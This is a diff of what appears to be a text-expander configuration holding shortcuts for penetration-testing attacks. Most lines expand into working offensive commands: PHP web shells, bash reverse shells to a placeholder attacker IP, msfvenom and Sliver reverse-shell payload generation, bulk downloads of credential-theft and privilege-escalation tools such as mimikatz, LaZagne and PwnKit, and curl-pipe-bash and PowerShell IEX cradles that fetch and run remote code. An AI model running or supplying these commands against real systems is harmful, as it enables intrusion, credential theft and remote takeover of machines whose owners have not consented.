@@ -22,7 +22,6 @@ global_vars:
       cmd: "xclip -o"
 
 
-
 matches:
 # QOL
   - trigger: ":ip"
@@ -38,11 +37,11 @@ matches:
       echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php
       echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'\"); ?>" > rev.php
       echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'" > shell.sh
-      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell86.elf &
-      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf &
-      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe &
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe &
-      msfvenom -p windows/powershell_reverse_tcp LHOST={{IP}} LPORT=443 -f psh
+      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell86.elf >/dev/null &
+      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf >/dev/null &
+      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe >/dev/null &
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe >/dev/null &
+      msfvenom -p windows/powershell_reverse_tcp LHOST={{IP}} LPORT=443 -f psh >/dev/null &
       cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . & 
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh & 
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
@@ -50,25 +49,31 @@ matches:
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
       wget -q https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip && unzip SharpHound-v1.1.0.zip &
       wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
+      wget -q https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1 &
+      wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 &
+      wget -q https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe &
+      wget -q https://github.com/skahwah/SQLRecon/releases/download/v3.3/SQLRecon.exe &
+      wget -q https://download.sysinternals.com/files/SysinternalsSuite.zip && unzip SysinternalsSuite.zip &
       wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
       wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
       wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit & 
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &                                                                 
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &                                                                  
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &  
+      git clone https://github.com/gerbsec/RedTeam-TradeCraft.git &                                                                
       python3 -m http.server 80
 
   - trigger: ":msfwin"
-    replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 -f exe -o shell.exe -e x64/zutto_dekiru LHOST=
+    replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 -f exe -o shell.exe  LHOST=
 
   - trigger: ":msfmwin"
-    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 -f exe -o shell.exe -e x64/zutto_dekiru LHOST=
+    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 -f exe -o shell.exe  LHOST=
 
   - trigger: ":msflin"
-    replace: msfvenom -p linux/x64/shell_reverse_tcp LPORT=443 -f elf -o shell.elf -e x64/zutto_dekiru LHOST=
+    replace: msfvenom -p linux/x64/shell_reverse_tcp LPORT=443 -f elf -o shell.elf  LHOST=
 
   - trigger: ":msfmlin"
-    replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=443 -f elf -o shell.elf -e x64/zutto_dekiru LHOST=
+    replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=443 -f elf -o shell.elf  LHOST=
   
   - trigger: ":msfsliver"
     replace: msfvenom -a x64 -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 LURI=/payload.woff -f exe -o sliverstage.exe EXITFUNC=thread
@@ -84,10 +89,10 @@ matches:
 
   - trigger: ":phpserver"
     replace: "php -S 0.0.0.0:"
-                                                                                
+
   - trigger: ":responder"
     replace: "sudo responder -I tun0"
-                                                                                
+
   - trigger: ":nc"
     replace: nc -nvlp 443
     
@@ -104,24 +109,6 @@ matches:
   - trigger: ":sliverstage"
     replace: stage-listener --url http://{{IP}}:8443 --prepend-size --profile shellcode-
 
-  - trigger: ":sliverwindlls"
-    replace: generate -e -f shared -m {{IP}}:443 -R
-  
-  - trigger: ":sliverwinexes"
-    replace: generate -e -f exe -m {{IP}}:443
-
-  - trigger: ":sliverlinexe"
-    replace: generate -e --mtls {{IP}}:443 -f exe -o linux 
-
-  - trigger: ":sliverlindll"
-    replace: generate -e --mtls {{IP}}:443 -f shared -o linux -R
-  
-  - trigger: ":sliverwindllb"
-    replace: generate beacon -e -f shared -S 23 -J 13 -R -m {{IP}}:443
-    
-  - trigger: ":sliverwinexeb"
-    replace: generate beacon -e -f exe -S 23 -J 13 -m {{IP}}:443  
-    
 # ENUMERATION
   - trigger: ":nmap"
     replace: sudo nmap -sC -sV -v -p- -o nmap {{clipboard}} --min-rate 
@@ -151,7 +138,7 @@ matches:
   # LINUX                                                                       
   - trigger: ":rcurl"                                                           
     replace: curl http://{{IP}}/shell.sh | bash
-                                                                                
+
   - trigger: ":rwget"
     replace: wget http://{{IP}}/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
     
@@ -191,7 +178,10 @@ matches:
   
   - trigger: ":wget"
     replace: wget http://{{IP}}/
-    
+  
+  - trigger: ":iwr"
+    replace: powershell.exe IEX(new-object net.webclient).downloadstring('http://{{IP}}/{{clipboard}}')
+
   - trigger: ":certutil"
     replace: certutil.exe -urlcache -split -f http://{{IP}}/
   
